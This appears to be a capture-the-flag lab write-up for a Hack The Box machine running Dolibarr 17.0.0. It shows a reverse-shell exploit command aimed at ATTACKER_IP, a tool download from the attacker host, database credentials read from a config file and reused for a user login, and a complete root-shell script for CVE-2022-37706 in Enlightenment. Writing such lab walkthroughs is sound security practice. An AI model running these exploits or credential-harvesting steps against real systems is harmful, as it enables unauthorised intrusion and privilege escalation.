Apache/2.4.41

![[Pasted image 20240914093128.png]]

`[Dolibarr 17.0.0](https://www.dolibarr.org)`

![[Pasted image 20240914093237.png]]

Login web-app:

admin:admin

Exploit for reverse shell

```php
python3 pwn.py http://crm.board.htb admin admin <ATTACKER_IP> <ATTACKER_PORT>
```

https://github.com/dollarboysushil/Dolibarr-17.0.0-Exploit-CVE-2023-30253?tab=readme-ov-file

**Linpeas**

OS: Linux version 5.15.0-107-generic

Sudo version 1.8.31

Details: https://dirtypipe.cm4all.com/
   Exposure: probable

127.0.0.1:33060
127.0.0.1:3306

larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash

/etc/apache2/sites-available/000-default.conf

https://wiki.dolibarr.org/index.php?title=Configuration_file

```php
find / -type d -name 'conf'
```

```php
/var/www/html/crm.board.htb/htdocs/conf
```

- conf.php
- conf.php.example
- conf.php.old

```php
/var/www/html/crm.board.htb/htdocs/conf/conf.php
```

![[Pasted image 20240918060058.png]]

dolibarr_main_db_user='dolibarrowner';
dolibarr_main_db_pass='serverfun2$2023!!';
dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5'

user: dolibarrowner
pass: serverfun2$2023!!
id: ef9a8f59524328e3c36894a9ff0562b5


```php
mysql -u <USERNAME> -p
```

Login to mysql

```php
mysql -u dolibarrowner -p
```

Pass

```php
serverfun2$2023!!
```

Database management

```php
use dolibarr
```

```php
SHOW DATABASES;
```
- I then exit to see the databases i can connect to

![[Pasted image 20240918061554.png]]

I try the pass with user larissa that i found earlier and get access to the account.

User: larissa
Pass: serverfun2$2023!!

The first flag is in the user home dir:
`32361a475e1717c2bcdab24f07e081e2`

Sorry, user larissa may not run sudo on localhost.

I make my standard hidden directory in /dev/shm/.z0d and start uploading my tools.
- I can just `rm -rf` the hidden directory when finished for easy clean up.

Start transfer server

```php
python3 -m http.server 80
```

Get files

```php
wget <ATTACKER_IP>/linpeas.sh
```

Linpeas results

Sudo version 1.8.31 

Internal ports
- 22
- 3306
- 53
- 33060

SUID

![[Pasted image 20240918063534.png]]

We see that the system runs a program called Enlightenment. What is it?

Essentially, Enlightenment is just a component of a graphical user interface that facilitates user-system interaction. This software manages the launching of apps, windows, as well as files.

This application has root permissions, therefore it can potentially be abused to gain root access.

According to vulnerability databases, this application has a major defect CVE-2022-37706 that permits privilege escalation. Fortunately, the exploit can be found on GitHub.

https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit

```php
file /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
```

```php
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c32a8a1b279ba209d1029c51435d64b86ca09b8b, for GNU/Linux 3.2.0, stripped
```

Exploit for CVE-2022-37706

```bash
#!/bin/bash

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Enjoy the root shell :)"
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```


![[Pasted image 20240918064340.png]]

Final flag
82cc63037aa91a2b6dec4e60ecd2713f
